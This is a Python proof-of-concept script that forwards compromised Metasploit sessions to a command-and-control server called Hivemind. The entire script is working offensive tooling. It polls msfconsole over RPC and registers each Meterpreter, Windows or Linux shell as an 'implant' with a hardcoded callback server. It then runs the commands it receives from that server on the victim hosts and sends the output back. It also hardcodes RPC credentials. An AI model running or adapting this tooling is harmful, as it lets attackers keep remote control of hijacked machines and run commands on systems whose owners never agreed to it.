# This POC forwards all sessions in a particular msfconsole server to Hivemind allowing them to be controlled from the Hivemind frontend

import json
import time
from pymetasploit3.msfrpc import MsfRpcClient
from hivemind import Hivemind, ModuleFunc, ParamTypes, Module, Implant

# Run this in msfconsole
# load msgrpc ServerHost=192.168.215.140 ServerPort=55553 User=user Pass='password'
client = MsfRpcClient(password='password', username='user', ssl=False, server='192.168.215.140', port=55553)

hivemind = Hivemind()
# Set to actual Hivemind server and port
hivemind.set_callback_server('192.168.86.35', 1234)

meterpreter_cmd_func = ModuleFunc('meterpreter shell', 'Run a command in meterpreter shell', ['command'], [ParamTypes.STRING])
meterpreter_mod = Module('meterpreter', 'Module for running Meterpreter commands', [meterpreter_cmd_func])

linux_cmd_func = ModuleFunc('linux shell', 'Run a command in Linux shell', ['command'], [ParamTypes.STRING])
linux_mod = Module('linux shell', 'Module for running Linux commands', [linux_cmd_func])

windows_cmd_func = ModuleFunc('windows shell', 'Run a command in Windows shell', ['command'], [ParamTypes.STRING])
windows_mod = Module('windows shell', 'Module for running Windows commands', [windows_cmd_func])

while True:
    time.sleep(5)
    for k, v in client.sessions.list.items():
        # Might need a more exact way to determine what type it is but it works for now
        if 'Command shell' == v['desc']:
            implant = Implant(v['tunnel_peer'], f'PAYLOAD {v["via_payload"]}', 'Meterpreter', f'EXPLOIT {v["via_exploit"]}', f'MSF {v["type"]}', '1.0')
            implant.add_module(meterpreter_mod)
        elif 'Windows' in v['info']:
            implant = Implant(v['tunnel_peer'], f'PAYLOAD {v["via_payload"]}', 'Windows', f'EXPLOIT {v["via_exploit"]}', f'MSF {v["type"]}', '1.0')
            implant.add_module(windows_mod)
        elif 'Linux' in v['via_payload']:
            implant = Implant(v['tunnel_peer'], f'PAYLOAD {v["via_payload"]}', 'Linux', f'EXPLOIT {v["via_exploit"]}', f'MSF {v["type"]}', '1.0')
            implant.add_module(linux_mod)
        else:
            print('Unknown shell type adding to Hivemind but not adding modules')
            implant = Implant(v['tunnel_peer'], f'PAYLOAD {v["via_payload"]}', 'Unknown', f'EXPLOIT {v["via_exploit"]}', f'MSF {v["type"]}', '1.0')

        tmp = hivemind.implant_callback(implant.ip, implant)
        if tmp is not None:
            for x in tmp:
                cmd = json.loads(x['arguments'])['command']
                shell = client.sessions.session(k)
                shell.write(cmd)
                ret = shell.read()
                hivemind.implant_response(implant.ip, x['action_id'], ret)

